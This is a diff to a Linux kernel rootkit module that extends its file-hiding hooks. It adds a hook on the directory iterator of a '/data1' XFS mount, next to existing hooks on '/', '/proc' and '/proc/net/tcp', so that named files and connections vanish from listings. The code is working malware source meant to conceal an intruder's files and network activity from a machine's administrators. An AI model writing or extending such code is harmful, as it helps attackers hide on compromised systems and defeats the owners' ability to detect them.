@@ -38,6 +38,7 @@ static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #else
 static int (*proc_iterate)(struct file *file, struct dir_context *);
 static int (*root_iterate)(struct file *file, struct dir_context *);
+static int (*data1_iterate)(struct file *file, struct dir_context *);
     #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 6, 0)
     #define ITERATE_NAME iterate
     #else
@@ -588,6 +589,17 @@ static int n_root_filldir( struct dir_context *nrf_ctx, const char *name, int na
     return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
 }
 
+static int n_data1_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_files, list )
+        if ( ! strcmp(name, hf->name) )
+            return 0;
+
+    return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
+}
+
 #endif
 
 int n_root_iterate ( ITERATE_PROTO )
@@ -599,6 +611,19 @@ int n_root_iterate ( ITERATE_PROTO )
     hijack_pause(root_iterate);
     REPLACE_FILLDIR(root_iterate, n_root_filldir);
     hijack_resume(root_iterate);
+
+    return ret;
+}
+
+int n_data1_iterate ( ITERATE_PROTO )
+{
+    int ret;
+
+    root_filldir = FILLDIR_VAR;
+
+    hijack_pause(data1_iterate);
+    REPLACE_FILLDIR(data1_iterate, n_data1_filldir);
+    hijack_resume(data1_iterate);
 
     return ret;
 }
@@ -1009,9 +1034,13 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     proc_iterate = get_vfs_iterate("/proc");
     hijack_start(proc_iterate, &n_proc_iterate);
 
-    /* Hook / for hiding files and directories */
+    /* Hook / (ext4 here) for hiding files and directories */
     root_iterate = get_vfs_iterate("/");
     hijack_start(root_iterate, &n_root_iterate);
+
+    /* Hook /data1 (xfs here) for hiding files and directories */
+    data1_iterate = get_vfs_iterate("/data1");
+    hijack_start(data1_iterate, &n_data1_iterate);
 
     /* Hook /proc/net/tcp for hiding tcp4 connections */
     tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
@@ -1080,6 +1109,7 @@ static void __exit mischief_managed ( void )
     hijack_stop(tcp6_seq_show);
     hijack_stop(tcp4_seq_show);
     hijack_stop(root_iterate);
+    hijack_stop(data1_iterate);
     hijack_stop(proc_iterate);
 }
 
